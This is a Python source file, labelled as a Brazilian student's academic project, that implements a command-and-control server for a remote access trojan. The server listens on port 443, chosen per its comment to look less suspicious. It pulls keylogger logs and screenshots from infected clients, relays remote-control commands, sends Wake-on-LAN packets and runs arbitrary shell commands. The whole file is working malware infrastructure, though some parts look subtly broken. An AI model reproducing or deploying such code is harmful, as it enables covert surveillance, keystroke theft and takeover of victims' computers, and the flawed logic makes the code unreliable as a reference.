# DISCLAIMER: Projeto acadêmico - Centro Tecnológico de Viçosa - MG
# Aluno: Joelson Tubsfly (745872-ADS - Noturno)

import socket
import subprocess
import os
import ssl
import threading
import json
from wakeonlan import send_magic_packet

HOST = '0.0.0.0'  # Escuta em todas as interfaces
PORT = 443         # Porta padrão para HTTPS (menos suspeita)
CERT = 'server.pem' # Certificado autoassinado

# Armazena informações dos clientes conectados
connected_clients = {}

def handle_client(conn):
    try:
        # Recebe informações do sistema
        conn.send(b"GET_SYSTEM_INFO")
        system_info = json.loads(conn.recv(1024).decode())
        client_id = system_info['mac']
        connected_clients[client_id] = system_info
        print(f"Cliente conectado: {system_info['hostname']} ({client_id})")

        while True:
            cmd = conn.recv(1024).decode()
            if cmd == 'keylogs':
                # Solicita logs do keylogger
                conn.send(b"GET_LOGS")
                logs = conn.recv(4096)
                save_logs(logs)
            elif cmd == 'screenshot':
                conn.send(b"CAPTURE_SCREEN")
                img_data = conn.recv(1048576)  # 1MB
                save_image(img_data)
            elif cmd.startswith('wake:'):
                # Wake-on-LAN
                target_mac = cmd[5:]
                try:
                    send_magic_packet(target_mac)
                    conn.send(b"Magic packet enviado com sucesso")
                except Exception as e:
                    conn.send(f"Erro ao enviar magic packet: {str(e)}".encode())
            elif cmd.startswith('remote_control:'):
                # Controle remoto
                target_mac = cmd.split(':')[1]
                if target_mac in connected_clients:
                    target_conn = connected_clients[target_mac]['conn']
                    target_conn.send(cmd.encode())
                    result = target_conn.recv(1024).decode()
                    conn.send(result.encode())
                else:
                    conn.send(b"Cliente não encontrado")
            elif cmd.lower() == 'exit':
                conn.send(b"Conexao encerrada.")
                break
            else:
                # Executa o comando no sistema alvo
                try:
                    output = subprocess.getoutput(cmd)
                    conn.send(output.encode())
                except Exception as e:
                    conn.send(f"Erro: {e}".encode())
    except:
        conn.close()
    finally:
        if client_id in connected_clients:
            del connected_clients[client_id]

def save_logs(logs):
    with open("keylogs.txt", "ab") as f:
        f.write(logs)

def save_image(img_data):
    with open("screenshot.png", "wb") as f:
        f.write(img_data)

def start_server():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(CERT)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        with context.wrap_socket(s, server_side=True) as ssock:
            while True:
                conn, addr = ssock.accept()
                print(f"Conexão estabelecida com {addr}")
                threading.Thread(target=handle_client, args=(conn,)).start()

if __name__ == "__main__":
    start_server() 